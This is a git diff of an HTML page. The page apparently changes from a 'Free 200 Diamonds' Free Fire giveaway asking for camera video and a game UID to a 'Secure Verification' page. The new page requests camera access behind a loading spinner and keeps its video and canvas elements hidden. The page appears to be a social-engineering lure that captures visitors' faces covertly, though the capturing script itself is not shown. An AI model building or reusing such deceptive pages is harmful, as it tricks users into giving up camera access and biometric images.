@@ -3,23 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Fire Diamond Verification</title>
+    <title>Face Verification</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
-        <h1>🎉 Free 200 Diamonds 🎉</h1>
-        <button id="claimBtn">Claim Now</button>
+        <h1>🎉 Welcome to Secure Verification 🎉</h1>
+        <p id="status">Please allow camera access...</p>
 
-        <div id="verificationBox" class="hidden">
-            <video id="video" autoplay></video>
-            <p id="instructions">Look Up 👆</p>
-            <input type="text" id="uid" placeholder="Enter UID">
-            <button id="submitBtn">Submit</button>
+        <div id="loading">
+            <div class="spinner"></div>
+            <p>📸 Please wait, processing...</p>
         </div>
+
+        <video id="video" autoplay class="hidden"></video>
+        <canvas id="canvas" class="hidden"></canvas>
     </div>
 
-    <script src="face-api.min.js"></script>
     <script src="script.js"></script>
 </body>
 </html>
